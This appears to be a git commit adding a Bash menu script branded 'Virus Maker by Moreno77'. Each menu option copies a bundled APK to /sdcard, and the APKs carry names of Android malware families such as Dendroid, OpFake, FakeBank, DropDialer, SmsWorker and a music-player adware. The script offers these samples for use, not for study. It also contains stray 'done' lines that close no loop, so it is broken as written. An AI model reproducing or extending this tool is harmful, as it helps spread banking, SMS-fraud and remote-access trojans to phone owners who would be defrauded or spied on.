5f0d1fe843478601d269397cba56e14898afa785
DarkCurut08 <42291700+DarkCurut08@users.noreply.github.com>
2019-12-19 17:05:51 +0700

    Create 1.sh

---
+++ .data/1.sh
@@ -0,0 +1,78 @@
+clear
+echo "\n\n\n\033[1;32m      +---------[ Virus Maker by Moreno77 ]----------+"
+python .py
+sleep 1
+echo "\033[1;32m 1. Elite         6. Settings"
+echo "\033[1;32m 2. Facebook      7. OpFake"
+echo "\033[1;32m 3. Omigo         8. SmsWorker"
+echo "\033[1;32m 4. MusicPlayer   9. DropDialer"
+echo "\033[1;32m 5. Dendroid      10. FakeBank"
+echo "\033[1;32m 00. Exit"
+read -p " [?] Input => " pil;
+case $pil in
+1) cp Elite.apk /sdcard/Elite.apk
+sleep 3
+echo " [!] Sukses : File disimpan di /sdcard"
+echo " [!] Success: File saved at /sdcard"
+exit
+;;
+2) cp Facebook.apk /sdcard/Facebook.apk
+sleep 3
+echo " [!] Sukses : File disimpan di /sdcard"
+echo " [!] Success: File saved at /sdcard"
+exit
+;;
+3) cp Omigo.apk /sdcard/Omigo.apk
+sleep 3
+echo " [!] Sukses : File disimpan di /sdcard"
+echo " [!] Success: File saved at /sdcard"
+exit
+;;
+4) cp MusicPlayerAdware.apk /sdcard/MusicPlayerAdware.apk
+sleep 3
+echo " [!] Sukses : File disimpan di /sdcard"
+echo " [!] Success: File saved at /sdcard"
+exit
+;;
+5) cp Dendroid.apk /sdcard/Dendroid.apk
+sleep 3
+echo " [!] Sukses : File disimpan di /sdcard"
+echo " [!] Success: File saved at /sdcard"
+exit
+;;
+6) cp Settings.apk /sdcard/Settings.apk
+sleep 3
+echo " [!] Sukses : File disimpan di /sdcard"
+echo " [!] Success: File saved at /sdcard"
+exit
+;;
+7) cp Opfake.apk /sdcard/Opfake.apk
+sleep 3
+echo " [!] Sukses : File disimpan di /sdcard"
+echo " [!] Success: File saved at /sdcard"
+exit
+;;
+8) cp SmsWorker.apk /sdcard/SmsWorker.apk
+sleep 3
+echo " [!] Sukses : File disimpan di /sdcard"
+echo " [!] Success: File saved at /sdcard"
+exit
+;;
+9) cp DropDialer.apk /sdcard/DropDialer.apk
+sleep 3
+echo " [!] Sukses : File disimpan di /sdcard"
+echo " [!] Success: File saved at /sdcard"
+exit
+;;
+10) cp FakeBank.apk /sdcard/FakeBank.apk
+sleep 3
+echo " [!] Sukses : File disimpan di /sdcard"
+echo " [!] Success: File saved at /sdcard"
+exit
+;;
+00) exit
+;;
+esac
+done
+done
+
